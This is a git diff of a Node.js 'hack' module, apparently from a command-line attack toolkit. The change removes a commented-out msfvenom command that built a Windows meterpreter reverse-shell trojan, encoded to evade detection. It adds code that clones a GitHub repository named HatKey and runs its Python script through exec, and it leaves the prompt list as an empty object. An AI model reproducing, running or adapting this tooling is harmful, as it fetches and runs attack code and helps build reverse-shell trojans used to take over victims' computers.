@@ -1,46 +1,34 @@
 const inquirer = require("inquirer");
 var clone = require("nodegit").Clone.clone;
+const {PythonShell} =require('python-shell'); 
 
 exports.hack = (exec) => {
   inquirer
     .prompt([
       {
-        type: "input",
-        message: "Enter you ip address",
-        name: "ip",
+
       },
-    //   {
-    //     type: "input",
-    //     message: "Enter desired port",
-    //     name: "port",
-    //     default: "3333",
-    //   },
-    //   {
-    //     type: "input",
-    //     message: "Enter desired file name",
-    //     name: "fileName",
-    //     default: "trojan",
-    //   },
     ])
     .then((response) => {
-    //   const command = `sudo msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=${response.ip} LPORT=${response.port} -b x00 -e x86/shikata_ga_nai -f exe -o ../bin/${response.fileName}.exe`;
       var fs = require('fs');
       var dir = './HatKey';
 
-     if (!fs.existsSync(dir)){
+     if (!fs.existsSync(dir)){//make the 'HatKey' folder
          fs.mkdirSync(dir);
         }
-    clone("https://github.com/Naayouu/Hatkey", "./HatKey");
+    clone("https://github.com/Naayouu/Hatkey", "./HatKey"); //clone repo to hatkey folder
+    
+    const command = "cd ./HatKey && python HatKey.py" //open HatKey folder and run HatKey python script
 
-    //   exec(command, (error, stdout, stderr) => {
-    //     console.log("stdout", stdout);
-    //     console.log("stderr", stderr);
-    //     if (error !== null) {
-    //       console.log(error);
-    //     }
-    //   });
-    // })
-    // .catch((error) => {
-    //   console.log(error);
+      exec(command, (error, stdout, stderr) => {
+        console.log("stdout", stdout);
+        console.log("stderr", stderr);
+        if (error !== null) {
+          console.log(error);
+        }
+      });
+    })
+    .catch((error) => {
+      console.log(error);
      });
 };
